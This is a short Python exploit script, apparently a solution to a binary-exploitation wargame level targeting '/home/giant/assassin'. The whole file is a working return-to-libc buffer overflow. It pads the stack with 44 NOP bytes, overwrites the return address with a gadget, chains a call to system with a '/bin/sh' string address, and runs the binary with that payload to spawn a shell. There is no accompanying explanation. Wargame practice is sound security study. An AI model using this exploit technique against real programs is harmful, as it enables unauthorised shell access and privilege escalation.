import os
from struct import *

p = lambda x : pack("<L",x)


target="/home/giant/assassin"
ret = 0x804851e
system=0x40058ae0
binsh=0x400fbff9
limit = 44



payload = "\x90"*limit+p(ret)+p(system)+"JUNK"+p(binsh)

os.execv(target,[target,payload])
